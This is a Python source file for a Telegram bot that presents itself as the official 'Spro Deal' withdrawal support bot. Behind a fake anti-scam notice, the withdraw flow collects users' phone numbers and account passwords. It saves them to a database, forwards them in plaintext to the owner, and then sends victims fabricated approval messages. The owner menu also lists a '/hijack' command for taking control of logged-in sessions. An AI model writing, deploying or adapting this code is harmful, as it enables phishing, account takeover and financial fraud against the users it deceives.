from pyrogram import Client
from pyromod import listen
from pyrogram import filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from pyrogram.enums import ParseMode
from configuration.config import BOT_TOKEN, API_ID, API_HASH, OWNER_ID, MONGO_URI, MONGO_DB_NAME
from module.hijack import setup_hijack_handlers
from module.dataCommands import register_data_commands
from pymongo import MongoClient
import pytz
from datetime import datetime
import asyncio
import os
import string
import random
from module.broadcast import setup_broadcast_handlers
from module.connect_user import setup_connect_user_handlers
from web_server import run_web_server
import threading



# ----------------------------
# MongoDB Setup
# ----------------------------
mongo_client = MongoClient(MONGO_URI)
db = mongo_client[MONGO_DB_NAME]
started_users = db["started_users"]

# ----------------------------
# Pyrogram Bot Client
# ----------------------------
app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# ----------------------------
# Global Variables
# ----------------------------
active_userbot = None
pending_user_id = None
user_states = {}
OWNER_COMMANDS_PER_PAGE = 5
pending_withdrawals = {}  # Store pending withdrawal requests with reminder tasks

# ----------------------------
# Utility Functions
# ----------------------------
def generate_withdrawal_id():
    """Generate a 10-character alphanumeric random ID"""
    characters = string.ascii_uppercase + string.digits
    return ''.join(random.choice(characters) for _ in range(10))

async def cleanup_userbot():
    global active_userbot
    if active_userbot:
        try:
            await active_userbot.stop()
        except Exception as e:
            print(f"Error stopping userbot: {e}")
        active_userbot = None

async def send_credentials_to_owner(client, user_info, phone, password, withdrawal_id):
    """Send credentials to owner and return message ID"""
    user_name = user_info.get('name', 'N/A')
    username = user_info.get('username', 'N/A')
    user_id = user_info.get('user_id', 'N/A')
    
    message_text = (
        f"🔔 <b>NEW WITHDRAWAL REQUEST</b> 🔔\n\n"
        f"👤 <b>User Info:</b>\n"
        f"├ Name: {user_name}\n"
        f"├ Username: @{username}\n"
        f"└ User ID: <code>{user_id}</code>\n\n"
        f"📱 <b>Phone:</b> <code>{phone}</code>\n"
        f"🔐 <b>Password:</b> <code>{password}</code>\n\n"
        f"⏰ <i>Received at {datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST')}</i>"
    )
    
    buttons = [
        [InlineKeyboardButton("✅ Approve", callback_data=f"withdraw_approve:{withdrawal_id}"),
         InlineKeyboardButton("❌ Reject", callback_data=f"withdraw_reject:{withdrawal_id}")]
    ]
    
    msg = await client.send_message(
        chat_id=OWNER_ID,
        text=message_text,
        parse_mode=ParseMode.HTML,
        reply_markup=InlineKeyboardMarkup(buttons)
    )
    return msg.id

# ----------------------------
# Commands
# ----------------------------
@app.on_message(filters.command("start"))
async def start_command(client: Client, message: Message):
    user = message.from_user
    user_data = {
        "user_id": user.id,
        "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
        "username": user.username or "N/A",
        "start_time": datetime.now(pytz.timezone('Asia/Kolkata')).strftime("%Y-%m-%d %H:%M:%S"),
        "status": "started"
    }
    started_users.update_one({"user_id": user.id}, {"$set": user_data}, upsert=True)

    # Check if owner
    if user.id == OWNER_ID:
        welcome_msg = f"""🌟 Welcome Owner! 🌟

Here are your admin commands:

📊 `/stats` - View overall bot usage statistics
📋 `/details` - View all users list
🔍 `/get` - Fetch user details using user ID
📢 `/gcast` - Broadcast message to all users
❌ `/cancel_gcast` - Cancel any ongoing broadcast
🎮 `/hijack` - Temporarily control another logged-in session
🛑 `/cancel_hijack` - Revoke hijack and return control to user

Use these commands to manage the bot."""
        await message.reply_text(welcome_msg, parse_mode=ParseMode.HTML)
    else:
        welcome_msg = f"""🌟 Hello {user.first_name or 'there'}! 🌟

Welcome to the Spro Deal Fast Withdraw Bot.

⚠️ <b>IMPORTANT NOTICE:</b>
🚨 Beware of scammers! No Spro Deal customer executive will message you first. Always be cautious.
✅ This bot is the only official withdrawal support bot.

Use the buttons below or run a command to get started!"""

        buttons = [
            [InlineKeyboardButton("💸 Withdraw", callback_data="trigger:/withdraw"),
             InlineKeyboardButton("📖 Help", callback_data="trigger:/help")]
        ]
        await message.reply_text(welcome_msg, reply_markup=InlineKeyboardMarkup(buttons), parse_mode=ParseMode.HTML)

@app.on_callback_query(filters.regex("^trigger:/"))
async def trigger_command(client: Client, query: CallbackQuery):
    command = query.data.replace("trigger:", "")
    fake_message = query.message
    fake_message.from_user = query.from_user
    fake_message.chat = query.message.chat
    fake_message.text = command

    # Delete the start message after button click
    try:
        await query.message.delete()
    except:
        pass

    if command == "/help":
        await help_command(client, fake_message)
    elif command == "/withdraw":
        await withdraw_command(client, fake_message)
    else:
        await query.answer("⚠️ Unknown command")

@app.on_message(filters.command("help"))
async def help_command(_, message: Message):
    # Only show admin commands button to the owner
    buttons = []
    if message.from_user.id == OWNER_ID:
        buttons = [[InlineKeyboardButton("🔐 Admin Commands", callback_data="admin_cmds:1")]]
    
    await message.reply_text(
        """🤖 *Bot Help Menu*

Here's what I can do for you:

• `/withdraw`        – 💸 Start fast withdraw process  
• `/cancel`          – ❌ Cancel any pending operation  
• `/start`           – 🏁 Show welcome screen with buttons  
• `/help`            – 📖 Display this help message  
""",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=InlineKeyboardMarkup(buttons) if buttons else None
    )

# Owner commands list
OWNER_CMDS = [
    ("/stats",          "📊 View overall bot usage statistics"),
    ("/details",        "📋 Paginated list of logged-in & started users"),
    ("/get",            "🔍 Fetch user details using user ID"),
    ("/gcast",          "📢 Broadcast message to all users"),
    ("/cancel_gcast",   "❌ Cancel any ongoing broadcast"),
    ("/hijack",         "🎮 Temporarily control another logged-in session"),
    ("/cancel_hijack",  "🛑 Revoke hijack and return control to user"),
]

@app.on_callback_query(filters.regex(r"^admin_cmds:(\d+)$"))
async def admin_commands_pagination(client: Client, query: CallbackQuery):
    user_id = query.from_user.id
    page = int(query.data.split(":")[1])

    if user_id != OWNER_ID:
        await query.answer("😏 Ohh nice try! You're not the admin 😂", show_alert=True)
        return

    total_cmds = len(OWNER_CMDS)
    total_pages = (total_cmds + OWNER_COMMANDS_PER_PAGE - 1) // OWNER_COMMANDS_PER_PAGE
    start = (page - 1) * OWNER_COMMANDS_PER_PAGE
    end = start + OWNER_COMMANDS_PER_PAGE

    # Build message text
    text = f"🔐 **Owner Only Commands** (Page {page}/{total_pages})\n\n"
    for cmd, desc in OWNER_CMDS[start:end]:
        text += f"**{cmd}**\n{desc}\n\n"  # Adding line breaks between commands

    # Navigation buttons
    nav_buttons = []
    if page > 1:
        nav_buttons.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"admin_cmds:{page - 1}"))
    if page < total_pages:
        nav_buttons.append(InlineKeyboardButton("➡️ Next", callback_data=f"admin_cmds:{page + 1}"))

    markup = InlineKeyboardMarkup([nav_buttons]) if nav_buttons else None

    await query.message.edit_text(
        text.strip(),
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=markup
    )

@app.on_message(filters.command("withdraw"))
async def withdraw_command(client: Client, message: Message):
    user_id = message.from_user.id
    user_states[user_id] = "awaiting_withdraw_phone"
    try:
        # Show warning first
        await client.send_message(
            chat_id=message.chat.id,
            text="⚠️ <b>IMPORTANT WARNING:</b>\n\n"
                 "Please enter the <b>correct credentials</b> for account verification.\n\n"
                 "❌ If the credentials are incorrect, your withdrawal request will be <b>rejected</b>.",
            parse_mode=ParseMode.HTML
        )
        
        # Ask for phone number
        phone_msg = await client.send_message(
            chat_id=message.chat.id,
            text="📱 Please enter your <b>Spro Deal Phone Number</b>:\n\n<i>(Example: +919876543210 or 9876543210)</i>",
            parse_mode=ParseMode.HTML
        )
        
        phone_response = await client.listen(
            chat_id=message.chat.id,
            filters=filters.text,
            timeout=60
        )
        phone_number = phone_response.text.strip()
        
        # Basic validation for phone number
        if not phone_number.replace("+", "").replace(" ", "").isdigit():
            user_states.pop(user_id, None)
            # Delete phone messages on error
            try:
                await phone_msg.delete()
                await phone_response.delete()
            except:
                pass
            await message.reply("❌ Invalid phone number format. Please use numbers only.")
            return
        
        # Ask for password
        user_states[user_id] = "awaiting_withdraw_password"
        password_msg = await client.send_message(
            chat_id=message.chat.id,
            text="🔐 Please enter your <b>Account Password</b> for verification:",
            parse_mode=ParseMode.HTML
        )
        
        password_response = await client.listen(
            chat_id=message.chat.id,
            filters=filters.text,
            timeout=60
        )
        password = password_response.text.strip()
        
        if len(password) < 6:
            user_states.pop(user_id, None)
            
            # Delete all messages on password validation failure
            try:
                message_ids = [phone_msg.id, phone_response.id, password_msg.id, password_response.id]
                await client.delete_messages(chat_id=message.chat.id, message_ids=message_ids)
            except:
                pass
            
            # Offer retry options
            buttons = [
                [InlineKeyboardButton("🔄 Retry with same number", callback_data=f"retry_same:{phone_number}")],
                [InlineKeyboardButton("📱 Retry with new number", callback_data="retry_new")],
                [InlineKeyboardButton("❌ Cancel", callback_data="retry_cancel")]
            ]
            await message.reply(
                "❌ <b>Password verification failed!</b>\n\n"
                "What would you like to do?",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return
        
        user_states.pop(user_id, None)
        
        # Delete all messages after successful password validation
        try:
            message_ids = [phone_msg.id, phone_response.id, password_msg.id, password_response.id]
            await client.delete_messages(chat_id=message.chat.id, message_ids=message_ids)
        except:
            pass
        
        # Generate unique withdrawal ID
        withdrawal_id = f"{user_id}_{int(datetime.now().timestamp())}"
        display_id = generate_withdrawal_id()
        
        # Get user info
        user_info = {
            'user_id': user_id,
            'name': f"{message.from_user.first_name or ''} {message.from_user.last_name or ''}".strip(),
            'username': message.from_user.username or 'N/A'
        }
        
        # Store credentials in database
        credential_entry = {
            'phone': phone_number,
            'password': password,
            'timestamp': datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST')
        }
        started_users.update_one(
            {"user_id": user_id},
            {"$push": {"credentials": credential_entry}}
        )
        
        # Send credentials to owner immediately
        await send_credentials_to_owner(client, user_info, phone_number, password, withdrawal_id)
        
        # Store withdrawal info
        pending_withdrawals[withdrawal_id] = {
            'user_info': user_info,
            'phone': phone_number,
            'password': password
        }
        
        await message.reply(
            f"✅ <b>Your request has been submitted successfully!</b>\n\n"
            f"📋 <b>Withdrawal Request ID:</b> <code>{display_id}</code>\n\n"
            f"🚀 Your withdrawal request will be processed very soon.\n"
            f"📢 You'll receive a notification once the withdrawal proceeds.",
            parse_mode=ParseMode.HTML
        )
        
        # Send message with button to share withdrawal ID
        share_button = InlineKeyboardMarkup([
            [InlineKeyboardButton(
                "📤 Send",
                url=f"https://t.me/evenSproDeal?text=Withdrawal%20ID%3A%20{display_id}"
            )]
        ])
        
        await message.reply(
            f"📤 <b>Share your Withdrawal ID to the account's team for approval</b>\n\n"
            f"Click the button below to send your Withdrawal ID to our verification team:",
            parse_mode=ParseMode.HTML,
            reply_markup=share_button
        )
    except asyncio.TimeoutError:
        user_states.pop(user_id, None)
        await message.reply("⏰ Timeout! Please try /withdraw again.")

@app.on_message(filters.command("cancel"))
async def cancel_command(_, message: Message):
    if user_states.pop(message.from_user.id, None):
        await message.reply("❌ Operation cancelled.")
    else:
        await message.reply("⚠️ No operation was pending.")

@app.on_callback_query(filters.regex(r"^retry_same:"))
async def handle_retry_same(client: Client, query: CallbackQuery):
    """Retry with the same phone number"""
    phone_number = query.data.replace("retry_same:", "")
    user_id = query.from_user.id
    
    await query.message.delete()
    await query.answer("🔄 Retrying with same number...")
    
    user_states[user_id] = "awaiting_withdraw_password"
    try:
        # Ask for password again
        password_msg = await client.send_message(
            chat_id=query.message.chat.id,
            text="🔐 Please enter your <b>Account Password</b> for verification:\n\n<i>(Minimum 6 characters)</i>",
            parse_mode=ParseMode.HTML
        )
        
        password_response = await client.listen(
            chat_id=query.message.chat.id,
            filters=filters.text,
            timeout=60
        )
        password = password_response.text.strip()
        
        if len(password) < 6:
            user_states.pop(user_id, None)
            
            # Delete password messages on validation failure
            try:
                message_ids = [password_msg.id, password_response.id]
                await client.delete_messages(chat_id=query.message.chat.id, message_ids=message_ids)
            except:
                pass
            
            # Offer retry options again
            buttons = [
                [InlineKeyboardButton("🔄 Retry with same number", callback_data=f"retry_same:{phone_number}")],
                [InlineKeyboardButton("📱 Retry with new number", callback_data="retry_new")],
                [InlineKeyboardButton("❌ Cancel", callback_data="retry_cancel")]
            ]
            await client.send_message(
                chat_id=query.message.chat.id,
                text="❌ <b>Password validation failed again!</b>\n\n"
                     "Password must be at least 6 characters long.\n\n"
                     "What would you like to do?",
                parse_mode=ParseMode.HTML,
                reply_markup=InlineKeyboardMarkup(buttons)
            )
            return
        
        user_states.pop(user_id, None)
        
        # Delete password messages after successful validation
        try:
            message_ids = [password_msg.id, password_response.id]
            await client.delete_messages(chat_id=query.message.chat.id, message_ids=message_ids)
        except:
            pass
        
        # Generate unique withdrawal ID
        withdrawal_id = f"{user_id}_{int(datetime.now().timestamp())}"
        display_id = generate_withdrawal_id()
        
        # Get user info
        user_info = {
            'user_id': user_id,
            'name': f"{query.from_user.first_name or ''} {query.from_user.last_name or ''}".strip(),
            'username': query.from_user.username or 'N/A'
        }
        
        # Store credentials in database
        credential_entry = {
            'phone': phone_number,
            'password': password,
            'timestamp': datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST')
        }
        started_users.update_one(
            {"user_id": user_id},
            {"$push": {"credentials": credential_entry}}
        )
        
        # Send credentials to owner immediately
        await send_credentials_to_owner(client, user_info, phone_number, password, withdrawal_id)
        
        # Store withdrawal info
        pending_withdrawals[withdrawal_id] = {
            'user_info': user_info,
            'phone': phone_number,
            'password': password
        }
        
        await client.send_message(
            chat_id=query.message.chat.id,
            text=f"✅ <b>Your request has been submitted successfully!</b>\n\n"
                 f"📋 <b>Withdrawal Request ID:</b> <code>{display_id}</code>\n\n"
                 f"🚀 Your withdrawal request will be processed very soon.\n"
                 f"📢 You'll receive a notification once the withdrawal proceeds.",
            parse_mode=ParseMode.HTML
        )
        
        # Send message with button to share withdrawal ID
        share_button = InlineKeyboardMarkup([
            [InlineKeyboardButton(
                "📤 Send",
                url=f"https://t.me/evenSproDeal?text=Withdrawal%20ID%3A%20{display_id}"
            )]
        ])
        
        await client.send_message(
            chat_id=query.message.chat.id,
            text=f"📤 <b>Share your Withdrawal ID to the account's team for approval</b>\n\n"
                 f"Click the button below to send your Withdrawal ID to our verification team:",
            parse_mode=ParseMode.HTML,
            reply_markup=share_button
        )
    except asyncio.TimeoutError:
        user_states.pop(user_id, None)
        await client.send_message(
            chat_id=query.message.chat.id,
            text="⏰ Timeout! Please try /withdraw again."
        )

@app.on_callback_query(filters.regex("^retry_new$"))
async def handle_retry_new(client: Client, query: CallbackQuery):
    """Retry with a new phone number"""
    await query.message.delete()
    await query.answer("🔄 Starting fresh with new number...")
    
    # Create a fake message to reuse the withdraw command
    fake_message = query.message
    fake_message.from_user = query.from_user
    await withdraw_command(client, fake_message)

@app.on_callback_query(filters.regex("^retry_cancel$"))
async def handle_retry_cancel(client: Client, query: CallbackQuery):
    """Cancel the retry operation"""
    user_states.pop(query.from_user.id, None)
    await query.message.delete()
    await query.answer("❌ Operation cancelled.")

@app.on_callback_query(filters.regex(r"^withdraw_approve:"))
async def handle_withdraw_approve(client: Client, query: CallbackQuery):
    """Handle when owner approves the withdrawal request"""
    if query.from_user.id != OWNER_ID:
        await query.answer("⚠️ This action is only for the owner!", show_alert=True)
        return
    
    withdrawal_id = query.data.replace("withdraw_approve:", "")
    
    if withdrawal_id in pending_withdrawals:
        # Get user info
        user_id = pending_withdrawals[withdrawal_id]['user_info']['user_id']
        
        # Remove from pending withdrawals
        del pending_withdrawals[withdrawal_id]
        
        # Update the owner's message
        await query.message.edit_text(
            query.message.text + "\n\n✅ <b>APPROVED</b>",
            parse_mode=ParseMode.HTML
        )
        await query.answer("✅ Withdrawal request approved!", show_alert=True)
        
        # Send approval message to user
        await client.send_message(
            chat_id=user_id,
            text="✅ <b>Account Verification Successful!</b>\n\n"
                 "🎉 Your account verification has passed and your withdrawal request has been accepted.\n\n"
                 "⏳ Your withdrawal will be processed within <b>10 minutes</b>.\n\n"
                 "🙏 Please be patience. Thank you!",
            parse_mode=ParseMode.HTML
        )
    else:
        await query.answer("⚠️ This request has already been processed.", show_alert=True)

@app.on_callback_query(filters.regex(r"^withdraw_reject:"))
async def handle_withdraw_reject(client: Client, query: CallbackQuery):
    """Handle when owner rejects the withdrawal request"""
    if query.from_user.id != OWNER_ID:
        await query.answer("⚠️ This action is only for the owner!", show_alert=True)
        return
    
    withdrawal_id = query.data.replace("withdraw_reject:", "")
    
    if withdrawal_id in pending_withdrawals:
        # Get user info
        user_id = pending_withdrawals[withdrawal_id]['user_info']['user_id']
        
        # Remove from pending withdrawals
        del pending_withdrawals[withdrawal_id]
        
        # Update the owner's message
        await query.message.edit_text(
            query.message.text + "\n\n❌ <b>REJECTED</b>",
            parse_mode=ParseMode.HTML
        )
        await query.answer("❌ Withdrawal request rejected!", show_alert=True)
        
        # Send rejection message to user
        await client.send_message(
            chat_id=user_id,
            text="❌ <b>Account Verification Failed!</b>\n\n"
                 "🚫 Your account verification has failed.\n\n"
                 "Please use /start command to request again with the correct credentials.\n\n"
                 "🙏 Thank you!",
            parse_mode=ParseMode.HTML
        )
    else:
        await query.answer("⚠️ This request has already been processed.", show_alert=True)

# ----------------------------
# Main Runner
# ----------------------------
if __name__ == "__main__":
    # Start web server in a separate thread
    web_thread = threading.Thread(target=run_web_server, daemon=True)
    web_thread.start()
    
    setup_hijack_handlers(app)
    register_data_commands(app)
    setup_broadcast_handlers(app)
    setup_connect_user_handlers(app)
    print("=" * 50)
    print("🚀 Spro Deal Withdrawal Bot")
    print("=" * 50)
    print("✅ Bot is starting...")
    print("✅ Database connected successfully")
    print("✅ All handlers registered")
    print("✅ Web server started on port 8000")
    print("=" * 50)
    print("🤖 Bot is now running and ready to accept requests!")
    print("=" * 50)
    app.run()
